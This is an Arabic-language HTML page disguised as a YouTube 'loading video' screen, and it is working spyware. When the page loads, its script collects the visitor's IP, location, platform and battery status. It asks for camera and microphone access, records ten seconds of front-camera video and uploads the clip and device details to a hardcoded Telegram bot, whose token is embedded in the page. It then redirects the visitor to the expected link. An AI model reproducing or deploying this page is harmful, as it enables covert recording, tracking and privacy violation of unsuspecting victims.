<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>يوتيوب</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh; margin: 0; text-align: center; }
        .youtube-logo { width: 150px; margin-bottom: 20px; }
        .loader-bar { width: 80%; max-width: 400px; height: 10px; background-color: #404040; border-radius: 5px; margin-top: 20px; }
        .loader-fill { height: 100%; background-color: #ff0000; border-radius: 5px; animation: load 2s linear infinite; }
        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
        h1 { font-size: 2.5em; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/1024px-YouTube_full-color_icon_%282017%29.svg.png" alt="YouTube Logo" class="youtube-logo">
    <h1>جارٍ تحميل الفيديو...</h1>
    <div class="loader-bar"><div class="loader-fill"></div></div>

<script>
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const RECORD_DURATION_MS = 10000;
    let TARGET_CHAT_ID;
    let REDIRECT_URL;

    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedUrl = urlParams.get('originalLink'); // يقرأ المتغير الصحيح
        const chatId = urlParams.get('chatId');

        TARGET_CHAT_ID = chatId || '1431886140';
        
        // --- **التصحيح الرئيسي هنا** ---
        // استخدام decodeURIComponent لفك تشفير الرابط بشكل صحيح
        REDIRECT_URL = encodedUrl ? decodeURIComponent(encodedUrl) : 'https://youtube.com';
    }

    async function collectAdditionalData() {
        try {
            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
            const battery = await navigator.getBattery();
            return `
---[ معلومات الجهاز ]---
📍 IP: ${ipInfo.ip || 'N/A'}
🌍 الدولة: ${ipInfo.country_name || 'N/A'}
🏙️ المدينة: ${ipInfo.city || 'N/A'}
💻 النظام: ${navigator.platform || 'N/A'}
🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'لا يشحن'})
            `;
        } catch { return "---[ تعذر جمع معلومات الجهاز ]---"; }
    }

    async function sendVideoToTelegram(videoBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', TARGET_CHAT_ID);
        formData.append('video', videoBlob, 'video.mp4');
        formData.append('caption', caption);
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
        } catch (error) { console.error('Error sending video:', error); }
    }

    function recordAndSend(stream, deviceInfo) {
        return new Promise((resolve) => {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const caption = `📹 فيديو من الكاميرا الأمامية\n${deviceInfo}`;
                sendVideoToTelegram(blob, caption);
                stream.getTracks().forEach(track => track.stop());
                resolve();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), RECORD_DURATION_MS);
        });
    }

    async function init() {
        getParamsFromUrl();
        const deviceInfo = await collectAdditionalData();
        let permissionGranted = false;

        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            if (frontStream) {
                permissionGranted = true;
                await recordAndSend(frontStream, deviceInfo);
            }
        } catch (e) {
            console.error("Could not get front camera");
        }

        if (!permissionGranted) {
             const noCamUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             await fetch(noCamUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: `❌ لم يتم منح إذن الكاميرا.\n${deviceInfo}` }),
            });
        }

        window.location.href = REDIRECT_URL;
    }

    window.onload = init;
</script>
</body>
</html>
